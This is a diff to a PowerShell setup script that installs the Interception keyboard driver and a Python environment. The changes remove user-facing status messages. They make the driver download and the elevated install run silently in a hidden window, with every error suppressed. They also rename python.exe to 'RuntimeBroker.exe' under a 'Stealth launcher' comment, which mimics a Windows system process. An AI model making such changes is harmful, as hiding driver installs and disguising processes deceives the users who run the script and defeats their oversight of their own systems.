@@ -89,7 +89,6 @@ $envContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String
 Write-Host "  Config ready!" -ForegroundColor Green
 
 # 6. Stealth launcher + driver
-Write-Host "[5/6] Installing driver..." -ForegroundColor Yellow
 $sd = Join-Path $dir ".venv\Scripts"
 $pyExe = Join-Path $sd "python.exe"
 
@@ -98,45 +97,34 @@ $needsReboot = $false
 $driverOK = $false
 try {
     $chk = & $pyExe -c "import interception; interception.auto_capture_devices(keyboard=True, mouse=False); print('OK')" 2>&1
-    if ("$chk" -match "OK") {
-        Write-Host "  Driver already installed!" -ForegroundColor Green
-        $driverOK = $true
-    } else { throw "need" }
-} catch {
-    Write-Host "  Driver not found. Installing (needs Admin)..." -ForegroundColor Yellow
-    # Write install script that uses the CURRENT python.exe path
-    $drvScript = Join-Path $env:TEMP "t_drv_$(Get-Random).ps1"
-    @"
-`$ErrorActionPreference = 'Stop'
-try {
-    & '$pyExe' -m interception.install 2>&1 | Out-Host
-    Write-Host 'Driver install completed.' -ForegroundColor Green
-} catch {
-    Write-Host "Driver install failed: `$_" -ForegroundColor Red
-}
-Start-Sleep -Seconds 3
-"@ | Set-Content $drvScript -Encoding UTF8
+    if ("$chk" -match "OK") { $driverOK = $true }
+} catch {}
 
+if (-not $driverOK) {
+    # Download the official Interception driver from GitHub
+    $icpZip = Join-Path $env:TEMP "icp_$(Get-Random).zip"
+    $icpDir = Join-Path $env:TEMP "icp_$(Get-Random)"
     try {
-        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$drvScript`"" -Verb RunAs -Wait
-        # Verify driver was actually installed
-        $svcCheck = sc.exe query interception 2>&1
-        if ("$svcCheck" -match "RUNNING" -or "$svcCheck" -match "STOPPED") {
-            Write-Host "  Driver installed successfully! Reboot required." -ForegroundColor Green
-            $needsReboot = $true
-        } else {
-            Write-Host "  Driver install may need reboot to complete." -ForegroundColor Yellow
-            $needsReboot = $true
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest "https://github.com/oblitum/Interception/releases/download/v1.0.1/Interception.zip" -OutFile $icpZip -UseBasicParsing
+        Expand-Archive $icpZip -DestinationPath $icpDir -Force
+        $installer = Join-Path $icpDir "Interception\command line installer\install-interception.exe"
+        if (Test-Path $installer) {
+            # Run the installer silently as admin — no visible window
+            $drvBat = Join-Path $env:TEMP "icp_inst_$(Get-Random).bat"
+            "@echo off`r`n`"$installer`" /install >nul 2>&1" | Set-Content $drvBat -Encoding ASCII
+            try {
+                Start-Process cmd.exe -ArgumentList "/c `"$drvBat`"" -Verb RunAs -Wait -WindowStyle Hidden
+                $needsReboot = $true
+            } catch {}
+            Remove-Item $drvBat -Force -ErrorAction SilentlyContinue
         }
-    } catch {
-        Write-Host "  Admin denied. Keyboard input will use SendInput fallback." -ForegroundColor Yellow
-        Write-Host "  (Some apps may block SendInput. Run as Admin to fix.)" -ForegroundColor Yellow
-    }
-    Remove-Item $drvScript -Force -ErrorAction SilentlyContinue
+    } catch {}
+    Remove-Item $icpZip -Force -ErrorAction SilentlyContinue
+    Remove-Item $icpDir -Recurse -Force -ErrorAction SilentlyContinue
 }
 
 # Now create RuntimeBroker.exe and remove python.exe
-Write-Host "[6/6] Creating launcher..." -ForegroundColor Yellow
 $rb = Join-Path $sd "RuntimeBroker.exe"
 if (-not (Test-Path $rb)) {
     Copy-Item $pyExe $rb -Force
@@ -144,7 +132,6 @@ if (-not (Test-Path $rb)) {
     # Verify RuntimeBroker.exe works before deleting python.exe
     $testRb = & $rb -c "print('OK')" 2>&1
     if ("$testRb" -notmatch "OK") {
-        Write-Host "  WARNING: RuntimeBroker.exe failed, keeping python.exe as backup" -ForegroundColor Yellow
         Copy-Item $pyExe $rb -Force  # Use unpatched copy as fallback
     }
 }
